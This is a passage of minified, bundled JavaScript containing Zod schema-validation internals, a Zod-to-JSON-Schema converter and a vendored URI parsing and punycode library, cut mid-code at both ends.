must be finite";break;default:Q=J.defaultError,N0.assertNever(X)}return{message:Q}},B7,yN,Z2=(X)=>{let{data:J,path:Q,errorMaps:Y,issueData:W}=X,z=[...Q,...W.path||[]],G={...W,path:z};if(W.message!==void 0)return{...W,path:z,message:W.message};let H="",U=Y.filter((K)=>!!K).slice().reverse();for(let K of U)H=K(G,{data:J,defaultError:H}).message;return{...W,path:z,message:H}},gf1,a1,K7=(X)=>({status:"dirty",value:X}),$9=(X)=>({status:"valid",value:X}),ez=(X)=>X.status==="aborted",XH=(X)=>X.status==="dirty",rX=(X)=>X.status==="valid",YQ=(X)=>typeof Promise!=="undefined"&&X instanceof Promise,h1,AN=(X,J)=>{if(rX(J))return{success:!0,data:J.value};else{if(!X.common.issues.length)throw new Error("Validation failed but no issues detected.");return{success:!1,get error(){if(this._error)return this._error;let Q=new s9(X.common.issues);return this._error=Q,this._error}}}},hf1,yf1,mf1,uf1,cf1,lf1,pf1,df1,if1="^(\\p{Extended_Pictographic}|\\p{Emoji_Component})+$",nz,rf1,nf1,af1,sf1,of1,tf1,mN="((\\d\\d[2468][048]|\\d\\d[13579][26]|\\d\\d0[48]|[02468][048]00|[13579][26]00)-02-29|\\d{4}-((0[13578]|1[02])-(0[1-9]|[12]\\d|3[01])|(0[469]|11)-(0[1-9]|[12]\\d|30)|(02)-(0[1-9]|1\\d|2[0-8])))",ef1,k8,GX,zX,q7,nX,WQ,Z7,M7,aX,WX,J6,GQ,b8,p0,F7,S6=(X)=>{if(X instanceof O7)return S6(X.schema);else if(X instanceof K8)return S6(X.innerType());else if(X instanceof R7)return[X.value];else if(X instanceof HX)return X.options;else if(X instanceof A7)return N0.objectValues(X.enum);else if(X instanceof N7)return S6(X._def.innerType);else if(X instanceof Z7)return[void 0];else if(X instanceof M7)return[null];else if(X instanceof U8)return[void 0,...S6(X.unwrap())];else if(X instanceof _6)return[null,...S6(X.unwrap())];else if(X instanceof O2)return S6(X.unwrap());else if(X instanceof D7)return S6(X.unwrap());else if(X instanceof L7)return S6(X._def.innerType);else return[]},j2,j7,Q6,zQ,HQ,sX,V7,O7,R7,HX,A7,oX,K8,U8,_6,N7,L7,UQ,Gg1,O2,KQ,D7,zg1,R1,Hg1=(X,J={message:`Input not instance of ${X.name}`})=>pN((Q)=>Q instanceof X,J),dN,iN,Ug1,Kg1,rN,Vg1,Bg1,qg1,Zg1,Mg1,Fg1,jg1,Og1,Rg1,Ag1,Ng1,Lg1,Dg1,wg1,Ig1,Cg1,Pg1,Sg1,Tg1,_g1,Eg1,$g1,kg1,bg1,LN,vg1,xg1,fg1,gg1,hg1=()=>dN().optional(),yg1=()=>iN().optional(),mg1=()=>rN().optional(),ug1,cg1,nN="2025-06-18",lg1,R2="2.0",aN,sN,pg1,V8,p9,VQ,Y6,B8,A2,oN,dg1=(X)=>oN.safeParse(X).success,tN,ig1=(X)=>tN.safeParse(X).success,eN,DN=(X)=>eN.safeParse(X).success,l0,XL,rg1=(X)=>XL.safeParse(X).success,r80,MH,FH,BQ,JL,ng1,QL,ag1,sg1,YL,jH,og1,OH,N2,L2,WL,GL,RH,zL,HL,tg1,QH,eg1,YH,Xh1,WH,Jh1,Qh1,Yh1,Wh1,Gh1,zh1,Hh1,GH,Uh1,zH,AH,NH,LH,Kh1,Vh1,UL,Bh1,qh1,Zh1,Mh1,Fh1,HH,jh1,KL,n80,UH,Oh1,VL,Rh1,Ah1,Nh1,Lh1,Dh1,wh1,BL,Ih1,Ch1,Ph1,Sh1,Th1,_h1,qL,Eh1,$h1,KH,kh1,bh1,vh1,ZL,xh1,a80,s80,o80,t80,e80,X60,n0,fh1=60000,hh1,FL,yh1,wN,mh1=(X)=>typeof X==="string"?{...wN,name:X}:{...wN,...X},uh1=(X)=>{let J=mh1(X),Q=J.name!==void 0?[...J.basePath,J.definitionPath,J.name]:J.basePath;return{...J,currentPath:Q,propertyPath:void 0,seen:new Map(Object.entries(J.definitions).map(([Y,W])=>[W._def,{def:W._def,path:[...J.basePath,J.definitionPath,Y],jsonSchema:void 0}]))}},ih1=(X,J)=>{return P0(X.innerType._def,J)},rh1=(X,J)=>{let Q={type:"integer",format:"unix-time"};if(J.target==="openApi3")return Q;for(let Y of X.checks)switch(Y.kind){case"min":_0(Q,"minimum",Y.value,Y.message,J);break;case"max":_0(Q,"maximum",Y.value,Y.message,J);break}return Q},oh1=(X)=>{if("type"in X&&X.type==="string")return!1;return"allOf"in X},az=void 0,E8,Xy1,M2,CN=(X,J)=>{let Q=(X.options instanceof Map?Array.from(X.options.values()):X.options).map((Y,W)=>P0(Y._def,{...J,currentPath:[...J.currentPath,"anyOf",`${W}`]})).filter((Y)=>!!Y&&(!J.strictUnions||typeof Y==="object"&&Object.keys(Y).length>0));return Q.length?{anyOf:Q}:void 0},qy1=(X,J)=>{if(J.currentPath.toString()===J.propertyPath?.toString())return P0(X.innerType._def,J);let Q=P0(X.innerType._def,{...J,currentPath:[...J.currentPath,"anyOf","1"]});return Q?{anyOf:[{not:{}},Q]}:{}},Zy1=(X,J)=>{if(J.pipeStrategy==="input")return P0(X.in._def,J);else if(J.pipeStrategy==="output")return P0(X.out._def,J);let Q=P0(X.in._def,{...J,currentPath:[...J.currentPath,"allOf","0"]}),Y=P0(X.out._def,{...J,currentPath:[...J.currentPath,"allOf",Q?"1":"0"]});return{allOf:[Q,Y].filter((W)=>W!==void 0)}},Ay1=(X,J)=>{return P0(X.innerType._def,J)},Ny1=(X,J,Q)=>{switch(J){case R1.ZodString:return AL(X,Q);case R1.ZodNumber:return Uy1(X,Q);case R1.ZodObject:return Ky1(X,Q);case R1.ZodBigInt:return ph1(X,Q);case R1.ZodBoolean:return dh1();case R1.ZodDate:return RL(X,Q);case R1.ZodUndefined:return Oy1();case R1.ZodNull:return Gy1(Q);case R1.ZodArray:return lh1(X,Q);case R1.ZodUnion:case R1.ZodDiscriminatedUnion:return zy1(X,Q);case R1.ZodIntersection:return th1(X,Q);case R1.ZodTuple:return jy1(X,Q);case R1.ZodRecord:return NL(X,Q);case R1.ZodLiteral:return eh1(X,Q);case R1.ZodEnum:return sh1(X);case R1.ZodNativeEnum:return Yy1(X);case R1.ZodNullable:return Hy1(X,Q);case R1.ZodOptional:return qy1(X,Q);case R1.ZodMap:return Qy1(X,Q);case R1.ZodSet:return Fy1(X,Q);case R1.ZodLazy:return()=>X.getter()._def;case R1.ZodPromise:return My1(X,Q);case R1.ZodNaN:case R1.ZodNever:return Wy1();case R1.ZodEffects:return ah1(X,Q);case R1.ZodAny:return ch1();case R1.ZodUnknown:return Ry1();case R1.ZodDefault:return nh1(X,Q);case R1.ZodBranded:return OL(X,Q);case R1.ZodReadonly:return Ay1(X,Q);case R1.ZodCatch:return ih1(X,Q);case R1.ZodPipeline:return Zy1(X,Q);case R1.ZodFunction:case R1.ZodVoid:case R1.ZodSymbol:return;default:return((Y)=>{return})(J)}},Ly1=(X,J)=>{switch(J.$refStrategy){case"root":return{$ref:X.path.join("/")};case"relative":return{$ref:Dy1(J.currentPath,X.path)};case"none":case"seen":{if(X.path.length<J.currentPath.length&&X.path.every((Q,Y)=>J.currentPath[Y]===Q))return console.warn(`Recursive reference detected at ${J.currentPath.join("/")}! Defaulting to any`),{};return J.$refStrategy==="seen"?{}:void 0}}},Dy1=(X,J)=>{let Q=0;for(;Q<X.length&&Q<J.length;Q++)if(X[Q]!==J[Q])break;return[(X.length-Q).toString(),...J.slice(Q)].join("/")},wy1=(X,J,Q)=>{if(X.description){if(Q.description=X.description,J.markdownDescription)Q.markdownDescription=X.description}return Q},PN=(X,J)=>{let Q=uh1(J),Y=typeof J==="object"&&J.definitions?Object.entries(J.definitions).reduce((U,[K,V])=>({...U,[K]:P0(V._def,{...Q,currentPath:[...Q.basePath,Q.definitionPath,K]},!0)??{}}),{}):void 0,W=typeof J==="string"?J:J?.nameStrategy==="title"?void 0:J?.name,z=P0(X._def,W===void 0?Q:{...Q,currentPath:[...Q.basePath,Q.definitionPath,W]},!1)??{},G=typeof J==="object"&&J.name!==void 0&&J.nameStrategy==="title"?J.name:void 0;if(G!==void 0)z.title=G;let H=W===void 0?Y?{...z,[Q.definitionPath]:Y}:z:{$ref:[...Q.$refStrategy==="relative"?[]:Q.basePath,Q.definitionPath,W].join("/"),[Q.definitionPath]:{...Y,[W]:z}};if(Q.target==="jsonSchema7")H.$schema="http://json-schema.org/draft-07/schema#";else if(Q.target==="jsonSchema2019-09"||Q.target==="openAi")H.$schema="https://json-schema.org/draft/2019-09/schema#";if(Q.target==="openAi"&&(("anyOf"in H)||("oneOf"in H)||("allOf"in H)||("type"in H)&&Array.isArray(H.type)))console.warn("Warning: OpenAI may not support schemas with unions as roots! Try wrapping it in an object property.");return H},VH,F2,Cy1,B2;var wH=j1(()=>{yx1=Object.create,mx1=Object.getPrototypeOf,oz=Object.defineProperty,ux1=Object.getOwnPropertyNames,cx1=Object.prototype.hasOwnProperty,dx1=Y0((X,J)=>{(function(Q,Y){typeof X==="object"&&typeof J!=="undefined"?Y(X):typeof define==="function"&&define.amd?define(["exports"],Y):Y(Q.URI=Q.URI||{})})(X,function(Q){function Y(){for(var v=arguments.length,P=Array(v),h=0;h<v;h++)P[h]=arguments[h];if(P.length>1){P[0]=P[0].slice(0,-1);var s=P.length-1;for(var e=1;e<s;++e)P[e]=P[e].slice(1,-1);return P[s]=P[s].slice(1),P.join("")}else return P[0]}function W(v){return"(?:"+v+")"}function z(v){return v===void 0?"undefined":v===null?"null":Object.prototype.toString.call(v).split(" ").pop().split("]").shift().toLowerCase()}function G(v){return v.toUpperCase()}function H(v){return v!==void 0&&v!==null?v instanceof Array?v:typeof v.length!=="number"||v.split||v.setInterval||v.call?[v]:Array.prototype.slice.call(v):[]}function U(v,P){var h=v;if(P)for(var s in P)h[s]=P[s];return h}function K(v){var P="[A-Za-z]",h="[\\x0D]",s="[0-9]",e="[\\x22]",I1=Y(s,"[A-Fa-f]"),Q0="[\\x0A]",j0="[\\x20]",L0=W(W("%[EFef]"+I1+"%"+I1+I1+"%"+I1+I1)+"|"+W("%[89A-Fa-f]"+I1+"%"+I1+I1)+"|"+W("%"+I1+I1)),g0="[\\:\\/\\?\\#\\[\\]\\@]",A0="[\\!\\$\\&\\'\\(\\)\\*\\+\\,\\;\\=]",h0=Y(g0,A0),X9=v?"[\\xA0-\\u200D\\u2010-\\u2029\\u202F-\\uD7FF\\uF900-\\uFDCF\\uFDF0-\\uFFEF]":"[]",x0=v?"[\\uE000-\\uF8FF]":"[]",D0=Y(P,s,"[\\-\\.\\_\\~]",X9),y0=W(P+Y(P,s,"[\\+\\-\\.]")+"*"),E0=W(W(L0+"|"+Y(D0,A0,"[\\:]"))+"*"),MX=W(W("25[0-5]")+"|"+W("2[0-4]"+s)+"|"+W("1"+s+s)+"|"+W("[1-9]"+s)+"|"+s),i9=W(W("25[0-5]")+"|"+W("2[0-4]"+s)+"|"+W("1"+s+s)+"|"+W("0?[1-9]"+s)+"|0?0?"+s),X8=W(i9+"\\."+i9+"\\."+i9+"\\."+i9),$0=W(I1+"{1,4}"),r9=W(W($0+"\\:"+$0)+"|"+X8),J8=W(W($0+"\\:")+"{6}"+r9),u8=W("\\:\\:"+W($0+"\\:")+"{5}"+r9),FX=W(W($0)+"?\\:\\:"+W($0+"\\:")+"{4}"+r9),V6=W(W(W($0+"\\:")+"{0,1}"+$0)+"?\\:\\:"+W($0+"\\:")+"{3}"+r9),l7=W(W(W($0+"\\:")+"{0,2}"+$0)+"?\\:\\:"+W($0+"\\:")+"{2}"+r9),xQ=W(W(W($0+"\\:")+"{0,3}"+$0)+"?\\:\\:"+$0+"\\:"+r9),fQ=W(W(W($0+"\\:")+"{0,4}"+$0)+"?\\:\\:"+r9),GJ=W(W(W($0+"\\:")+"{0,5}"+$0)+"?\\:\\:"+$0),zJ=W(W(W($0+"\\:")+"{0,6}"+$0)+"?\\:\\:"),B6=W([J8,u8,FX,V6,l7,xQ,fQ,GJ,zJ].join("|")),HJ=W(W(D0+"|"+L0)+"+"),e2=W(B6+"\\%25"+HJ),jX=W(B6+W("\\%25|\\%(?!"+I1+"{2})")+HJ),Sw=W("[vV]"+I1+"+\\."+Y(D0,A0,"[\\:]")+"+"),Tw=W("\\["+W(jX+"|"+B6+"|"+Sw)+"\\]"),T3=W(W(L0+"|"+Y(D0,A0))+"*"),p7=W(Tw+"|"+X8+"(?!"+T3+")|"+T3),d7=W(s+"*"),_3=W(W(E0+"@")+"?"+p7+W("\\:"+d7)+"?"),i7=W(L0+"|"+Y(D0,A0,"[\\:\\@]")),_w=W(i7+"*"),E3=W(i7+"+"),Ew=W(W(L0+"|"+Y(D0,A0,"[\\@]"))+"+"),q6=W(W("\\/"+_w)+"*"),UJ=W("\\/"+W(E3+q6)+"?"),XY=W(Ew+q6),gQ=W(E3+q6),KJ="(?!"+i7+")",Wc1=W(q6+"|"+UJ+"|"+XY+"|"+gQ+"|"+KJ),VJ=W(W(i7+"|"+Y("[\\/\\?]",x0))+"*"),r7=W(W(i7+"|[\\/\\?]")+"*"),$3=W(W("\\/\\/"+_3+q6)+"|"+UJ+"|"+gQ+"|"+KJ),$w=W(y0+"\\:"+$3+W("\\?"+VJ)+"?"+W("\\#"+r7)+"?"),kw=W(W("\\/\\/"+_3+q6)+"|"+UJ+"|"+XY+"|"+KJ),bw=W(kw+W("\\?"+VJ)+"?"+W("\\#"+r7)+"?"),Gc1=W($w+"|"+bw),zc1=W(y0+"\\:"+$3+W("\\?"+VJ)+"?"),Hc1="^("+y0+")\\:"+W(W("\\/\\/("+W("("+E0+")@")+"?("+p7+")"+W("\\:("+d7+")")+"?)")+"?("+q6+"|"+UJ+"|"+gQ+"|"+KJ+")")+W("\\?("+VJ+")")+"?"+W("\\#("+r7+")")+"?$",Uc1="^(){0}"+W(W("\\/\\/("+W("("+E0+")@")+"?("+p7+")"+W("\\:("+d7+")")+"?)")+"?("+q6+"|"+UJ+"|"+XY+"|"+KJ+")")+W("\\?("+VJ+")")+"?"+W("\\#("+r7+")")+"?$",Kc1="^("+y0+")\\:"+W(W("\\/\\/("+W("("+E0+")@")+"?("+p7+")"+W("\\:("+d7+")")+"?)")+"?("+q6+"|"+UJ+"|"+gQ+"|"+KJ+")")+W("\\?("+VJ+")")+"?$",Vc1="^"+W("\\#("+r7+")")+"?$",Bc1="^"+W("("+E0+")@")+"?("+p7+")"+W("\\:("+d7+")")+"?$";return{NOT_SCHEME:new RegExp(Y("[^]",P,s,"[\\+\\-\\.]"),"g"),NOT_USERINFO:new RegExp(Y("[^\\%\\:]",D0,A0),"g"),NOT_HOST:new RegExp(Y("[^\\%\\[\\]\\:]",D0,A0),"g"),NOT_PATH:new RegExp(Y("[^\\%\\/\\:\\@]",D0,A0),"g"),NOT_PATH_NOSCHEME:new RegExp(Y("[^\\%\\/\\@]",D0,A0),"g"),NOT_QUERY:new RegExp(Y("[^\\%]",D0,A0,"[\\:\\@\\/\\?]",x0),"g"),NOT_FRAGMENT:new RegExp(Y("[^\\%]",D0,A0,"[\\:\\@\\/\\?]"),"g"),ESCAPE:new RegExp(Y("[^]",D0,A0),"g"),UNRESERVED:new RegExp(D0,"g"),OTHER_CHARS:new RegExp(Y("[^\\%]",D0,h0),"g"),PCT_ENCODED:new RegExp(L0,"g"),IPV4ADDRESS:new RegExp("^("+X8+")$"),IPV6ADDRESS:new RegExp("^\\[?("+B6+")"+W(W("\\%25|\\%(?!"+I1+"{2})")+"("+HJ+")")+"?\\]?$")}}var V=K(!1),B=K(!0),Z=function(){function v(P,h){var s=[],e=!0,I1=!1,Q0=void 0;try{for(var j0=P[Symbol.iterator](),L0;!(e=(L0=j0.next()).done);e=!0)if(s.push(L0.value),h&&s.length===h)break}catch(g0){I1=!0,Q0=g0}finally{try{if(!e&&j0.return)j0.return()}finally{if(I1)throw Q0}}return s}return function(P,h){if(Array.isArray(P))return P;else if(Symbol.iterator in Object(P))return v(P,h);else throw new TypeError("Invalid attempt to destructure non-iterable instance")}}(),M=function(v){if(Array.isArray(v)){for(var P=0,h=Array(v.length);P<v.length;P++)h[P]=v[P];return h}else return Array.from(v)},F=2147483647,j=36,O=1,N=26,A=38,D=700,S=72,$=128,T="-",k=/^xn--/,E=/[^\0-\x7E]/,y=/[\x2E\u3002\uFF0E\uFF61]/g,a={overflow:"Overflow: input needs wider integers to process","not-basic":"Illegal input >= 0x80 (not a basic code point)","invalid-input":"Invalid input"},p=j-O,f=Math.floor,m=String.fromCharCode;function o(v){throw new RangeError(a[v])}function J1(v,P){var h=[],s=v.length;while(s--)h[s]=P(v[s]);return h}function H1(v,P){var h=v.split("@"),s="";if(h.length>1)s=h[0]+"@",v=h[1];v=v.replace(y,".");var e=v.split("."),I1=J1(e,P).join(".");return s+I1}function d(v){var P=[],h=0,s=v.length;while(h<s){var e=v.charCodeAt(h++);if(e>=55296&&e<=56319&&h<s){var I1=v.charCodeAt(h++);if((I1&64512)==56320)P.push(((e&1023)<<10)+(I1&1023)+65536);else P.push(e),h--}else P.push(e)}return P}var Q1=function v(P){return String.fromCodePoint.apply(String,M(P))},u=function v(P){if(P-48<10)return P-22;if(P-65<26)return P-65;if(P-97<26)return P-97;return j},z1=function v(P,h){return P+22+75*(P<26)-((h!=0)<<5)},B1=function v(P,h,s){var e=0;P=s?f(P/D):P>>1,P+=f(P/h);for(;P>p*N>>1;e+=j)P=f(P/p);return f(e+(p+1)*P/(P+A))},N1=function v(P){var h=[],s=P.length,e=0,I1=$,Q0=S,j0=P.lastIndexOf(T);if(j0<0)j0=0;for(var L0=0;L0<j0;++L0){if(P.charCodeAt(L0)>=128)o("not-basic");h.push(P.charCodeAt(L0))}for(var g0=j0>0?j0+1:0;g0<s;){var A0=e;for(var h0=1,X9=j;;X9+=j){if(g0>=s)o("invalid-input");var x0=u(P.charCodeAt(g0++));if(x0>=j||x0>f((F-e)/h0))o("overflow");e+=x0*h0;var D0=X9<=Q0?O:X9>=Q0+N?N:X9-Q0;if(x0<D0)break;var y0=j-D0;if(h0>f(F/y0))o("overflow");h0*=y0}var E0=h.length+1;if(Q0=B1(e-A0,E0,A0==0),f(e/E0)>F-I1)o("overflow");I1+=f(e/E0),e%=E0,h.splice(e++,0,I1)}return String.fromCodePoint.apply(String,h)},i1=function v(P){var h=[];P=d(P);var s=P.length,e=$,I1=0,Q0=S,j0=!0,L0=!1,g0=void 0;try{for(var A0=P[Symbol.iterator](),h0;!(j0=(h0=A0.next()).done);j0=!0){var X9=h0.value;if(X9<128)h.push(m(X9))}}catch(jX){L0=!0,g0=jX}finally{try{if(!j0&&A0.return)A0.return()}finally{if(L0)throw g0}}var x0=h.length,D0=x0;if(x0)h.push(T);while(D0<s){var y0=F,E0=!0,MX=!1,i9=void 0;try{for(var X8=P[Symbol.iterator](),$0;!(E0=($0=X8.next()).done);E0=!0){var r9=$0.value;if(r9>=e&&r9<y0)y0=r9}}catch(jX){MX=!0,i9=jX}finally{try{if(!E0&&X8.return)X8.return()}finally{if(MX)throw i9}}var J8=D0+1;if(y0-e>f((F-I1)/J8))o("overflow");I1+=(y0-e)*J8,e=y0;var u8=!0,FX=!1,V6=void 0;try{for(var l7=P[Symbol.iterator](),xQ;!(u8=(xQ=l7.next()).done);u8=!0){var fQ=xQ.value;if(fQ<e&&++I1>F)o("overflow");if(fQ==e){var GJ=I1;for(var zJ=j;;zJ+=j){var B6=zJ<=Q0?O:zJ>=Q0+N?N:zJ-Q0;if(GJ<B6)break;var HJ=GJ-B6,e2=j-B6;h.push(m(z1(B6+HJ%e2,0))),GJ=f(HJ/e2)}h.push(m(z1(GJ,0))),Q0=B1(I1,J8,D0==x0),I1=0,++D0}}}catch(jX){FX=!0,V6=jX}finally{try{if(!u8&&l7.return)l7.return()}finally{if(FX)throw V6}}++I1,++e}return h.join("")},d1=function v(P){return H1(P,function(h){return k.test(h)?N1(h.slice(4).toLowerCase()):h})},X0=function v(P){return H1(P,function(h){return E.test(h)?"xn--"+i1(h):h})},b1={version:"2.1.0",ucs2:{decode:d,encode:Q1},decode:N1,encode:i1,toASCII:X0,toUnicode:d1},S1={};function g(v){var P=v.charCodeAt(0),h=void 0;if(P<16)h="%0"+P.toString(16).toUpperCase();else if(P<128)h="%"+P.toString(16).toUpperCase();else if(P<2048)h="%"+(P>>6|192).toString(16).toUpperCase()+"%"+(P&63|128).toString(16).toUpperCase();else h="%"+(P>>12|224).toString(16).toUpperCase()+"%"+(P>>6&63|128).toString(16).toUpperCase()+"%"+(P&63|128).toString(16).toUpperCase();return h}function X1(v){var P="",h=0,s=v.length;while(h<s){var e=parseInt(v.substr(h+1,2),16);if(e<128)P+=String.fromCharCode(e),h+=3;else if(e>=194&&e<224){if(s-h>=6){var I1=parseInt(v.substr(h+4,2),16);P+=String.fromCharCode((e&31)<<6|I1&63)}else P+=v.substr(h,6);h+=6}else if(e>=224){if(s-h>=9){var Q0=parseInt(v.substr(h+4,2),16),j0=parseInt(v.substr(h+7,2),16);P+=String.fromCharCode((e&15)<<12|(Q0&63)<<6|j0&63)}else P+=v.substr(h,9);h+=9}else P+=v.substr(h,3),h+=3}return P}function V1(v,P){function h(s){var e=X1(s);return!e.match(P.UNRESERVED)?s:e}if(v.scheme)v.scheme=String(v.scheme).replace(P.PCT_ENCODED,h).toLowerCase().replace(P.NOT_SCHEME,"");if(v.userinfo!==void 0)v.userinfo=String(v.userinfo).replace(P.PCT_ENCODED,h).replace(P.NOT_USERINFO,g).replace(P.PCT_ENCODED,G);if(v.host!==void 0)v.host=String(v.host).replace(P.PCT_ENCODED,h).toLowerCase().replace(P.NOT_HOST,g).replace(P.PCT_ENCODED,G);if(v.path!==void 0)v.path=String(v.path).replace(P.PCT_ENCODED,h).replace(v.scheme?P.NOT_PATH:P.NOT_PATH_NOSCHEME,g).replace(P.PCT_ENCODED,G);if(v.query!==void 0)v.query=String(v.query).replace(P.PCT_ENCODED,h).replace(P.NOT_QUERY,g).replace(P.PCT_ENCODED,G);if(v.fragment!==void 0)v.fragment=String(v.fragment).replace(P.PCT_ENCODED,h).replace(P.NOT_FRAGMENT,g).replace(P.PCT_ENCODED,G);return v}function n(v){return v.replace(/^0*(.*)/,"$1")||"0"}function r(v,P){var h=v.match(P.IPV4ADDRESS)||[],s=Z(h,2),e=s[1];if(e)return e.split(".").map(n).join(".");else return v}function G1(v,P){var h=v.match(P.IPV6ADDRESS)||[],s=Z(h,3),e=s[1],I1=s[2];if(e){var Q0=e.toLowerCase().split("::").reverse(),j0=Z(Q0,2),L0=j0[0],g0=j0[1],A0=g0?g0.split(":").map(n):[],h0=L0.split(":").map(n),X9=P.IPV4ADDRESS.test(h0[h0.length-1]),x0=X9?7:8,D0=h0.length-x0,y0=Array(x0);for(var E0=0;E0<x0;++E0)y0[E0]=A0[E0]||h0[D0+E0]||"";if(X9)y0[x0-1]=r(y0[x0-1],P);var MX=y0.reduce(function(J8,u8,FX){if(!u8||u8==="0"){var V6=J8[J8.length-1];if(V6&&V6.index+V6.length===FX)V6.length++;else J8.push({index:FX,length:1})}return J8},[]),i9=MX.sort(function(J8,u8){return u8.length-J8.length})[0],X8=void 0;if(i9&&i9.length>1){var $0=y0.slice(0,i9.index),r9=y0.slice(i9.index+i9.length);X8=$0.join(":")+"::"+r9.join(":")}else X8=y0.join(":");if(I1)X8+="%"+I1;return X8}else return v}var $1=/^(?:([^:\/?#]+):)?(?:\/\/((?:([^\/?#@]*)@)?(\[[^\/?#\]]+\]|[^\/?#:]*)(?:\:(\d*))?))?([^?#]*)(?:\?([^#]*))?(?:#((?:.|\n|\r)*))?/i,m1="".match(/(){0}/)[1]===void 0;function t(v){var P=arguments.length>1&&arguments[1]!==void 0?arguments[1]:{},h={},s=P.iri!==!1?B:V;if(P.reference==="suffix")v=(P.scheme?P.scheme+":":"")+"//"+v;var e=v.match($1);if(e){if(m1){if(h.scheme=e[1],h.userinfo=e[3],h.host=e[4],h.port=parseInt(e[5],10),h.path=e[6]||"",h.query=e[7],h.fragment=e[8],isNaN(h.port))h.port=e[5]}else if(h.scheme=e[1]||void 0,h.userinfo=v.indexOf("@")!==-1?e[3]:void 0,h.host=v.indexOf("//")!==-1?e[4]:void 0,h.port=parseInt(e[5],10),h.path=e[6]||"",h.query=v.indexOf("?")!==-1?e[7]:void 0,h.fragment=v.indexOf("#")!==-1?e[8]:void 0,isNaN(h.port))h.port=v.match(/\/\/(?:.|\n)*\:(?:\/|\?|\#|$)/)?e[4]:void 0;if(h.host)h.host=G1(r(h.host,s),s);if(h.scheme===void 0&&h.userinfo===void 0&&h.host===void 0&&h.port===void 0&&!h.path&&h.query===void 0)h.reference="same-document";else if(h.scheme===void 0)h.reference="relative";else if(h.fragment===void 0)h.reference="absolute";else h.reference="uri";if(P.reference&&P.reference!=="suffix"&&P.reference!==h.reference)h.error=h.error||"URI is not a "+P.reference+" reference.";var I1=S1[(P.scheme||h.scheme||"").toLowerCase()];if(!P.unicodeSupport&&(!I1||!I1.unicodeSupport)){if(h.host&&(P.domainHost||I1&&I1.domainHost))try{h.host=b1.toASCII(h.host.replace(s.PCT_ENCODED,X1).toLowerCase())}catch(Q0){h.error=h.error||"Host's domain name can not be converted to ASCII via punycode: "+Q0}V1(h,V)}else V1(h,s);if(I1&&I1.parse)I1.parse(h,P)}else h.error=h.error||"URI can not be parsed.";return h}function Y1(v,P){var h=P.iri!==!1?B:V,s=[];if(v.userinfo!==void 0)s.push(v.userinfo),s.push("@");if(v.host!==void 0)s.push(G1(r(String(v.host),h),h).replace(h.IPV6ADDRESS,function(e,I1,Q0){return"["+I1+(Q0?"%25"+Q0:"")+"]"}));if(typeof v.port==="number"||typeof v.port==="string")s.push(":"),s.push(String(v.port));return s.length?s.join(""):void 0}var Z1=/^\.\.?\//,M1=/^\/\.(\/|$)/,g1=/^\/\.\.(\/|$)/,k1=/^\/?(?:.|\n)*?(?=\/|$)/;function J0(v){var P=[];while(v.length)if(v.match(Z1))v=v.replace(Z1,"");else if(v.match(M1))v=v.replace(M1,"/");else if(v.match(g1))v=v.replace(g1,"/"),P.pop();else if(v==="."||v==="..")v="";else{var h=v.match(k1);if(h){var s=h[0];v=v.slice(s.length),P.push(s)}else throw new Error("Unexpected dot segment condition")}return P.join("")}function W0(v){var P=arguments.length>1&&arguments[1]!==void 0?arguments[1]:{},h=P.iri?B:V,s=[],e=S1[(P.scheme||v.scheme||"").toLowerCase()];if(e&&e.serialize)e.serialize(v,P);if(v.host){if(h.IPV6ADDRESS.test(v.host));else if(P.domainHost||e&&e.domainHost)try{v.host=!P.iri?b1.toASCII(v.host.replace(h.PCT_ENCODED,X1).toLowerCase()):b1.toUnicode(v.host)}catch(j0){v.error=v.error||"Host's domain name can not be converted to "+(!P.iri?"ASCII":"Unicode")+" via punycode: "+j0}}if(V1(v,h),P.reference!=="suffix"&&v.scheme)s.push(v.scheme),s.push(":");var I1=Y1(v,P);if(I1!==void 0){if(P.reference!=="suffix")s.push("//");if(s.push(I1),v.path&&v.path.charAt(0)!=="/")s.push("/")}if(v.path!==void 0){var Q0=v.path;if(!P.absolutePath&&(!e||!e.absolutePath))Q0=J0(Q0);if(I1===void 0)Q0=Q0.replace(/^\/\//,"/%2F");s.push(Q0)}if(v.query!==void 0)s.push("?"),s.push(v.query);if(v.fragment!==void 0)s.push("#"),s.push(v.fragment);return s.join("")}function I0(v,P){var h=arguments.length>2&&arguments[2]!==void 0?arguments[2]:{},s=arguments[3],e={};if(!s)v=t(W0(v,h),h),P=t(W0(P,h),h);if(h=h||{},!h.tolerant&&P.scheme)e.scheme=P.scheme,e.userinfo=P.userinfo,e.host=P.host,e.port=P.port,e.path=J0(P.path||""),e.query=P.query;else{if(P.userinfo!==void 0||P.host!==void 0||P.port!==void 0)e.userinfo=P.userinfo,e.host=P.host,e.port=P.port,e.path=J0(P.path||""),e.query=P.query;else{if(!P.path)if(e.path=v.path,P.query!==void 0)e.query=P.query;else e.query=v.query;else{if(P.path.charAt(0)==="/")e.path=J0(P.path);else{if((v.userinfo!==void 0||v.host!==void 0||v.port!==void 0)&&!v.path)e.path="/"+P.path;else if(!v.path)e.path=P.path;else e.path=v.path.slice(0,v.path.lastIndexOf("/")+1)+P.path;e.path=J0(e.path)}e.query=P.query}e.userinfo=v.userinfo,e.host=v.host,e.port=v.port}e.scheme=v.scheme}return e.fragment=P.fragment,e}function G9(v,P,h){var s=U({scheme:"null"},h);return W0(I0(t(v,s),t(P,s),s,!0),s)}function a0(v,P){if(typeof v==="string")v=W0(t(v,P),P);else if(z(v)==="object")v=t(W0(v,P),P);return v}function e9(v,P,h){if(typeof v==="string")v=W0(t(v,h),h);else if(z(v)==="object")v=W0(v,h);if(typeof P==="string")P=W0(t(P,h),h);else if(z(P)==="object")P=W0(P,h);return v===P}function y8(v,P){return v&&v.toString().replace(!P||!P.iri?V.ESCAPE:B.ESCAPE,g)}function s0(v,P){return v&&v.toString().replace(!P||!P.iri?V.PCT_ENCODED:B.PCT_ENCODED,X1)}var D9={scheme:"http",domainHost:!0,parse:function v(P,h){if(!P.host)P.error=P.error||"HTTP URIs must have a host.";return P},serialize:function v(P,h){var s=String(P.scheme).toLowerCase()==="https";if(P.port===(s?443:80)||P.port==="")P.port=void 0;if(!P.path)P.path="/";return P}},x9={scheme:"https",domainHost:D9.domainHost,parse:D9.parse,serialize:D9.serialize};function m8(v){return typeof v.secure==="boolean"?v.secure:String(v.scheme).toLowerCase()==="wss"}var ZX={scheme:"ws",domainHost:!0,parse:function v(P,h){var s=P;return s.secure=m8(s),s.resourceName=(s.path||"/")+(s.query?"?"+s.query:""),s.path=void 0,s.query=void 0,s},serialize:function v(P,h){if(P.port===(m8(P)?443:80)||P.port==="")P.port=void 0;if(typeof 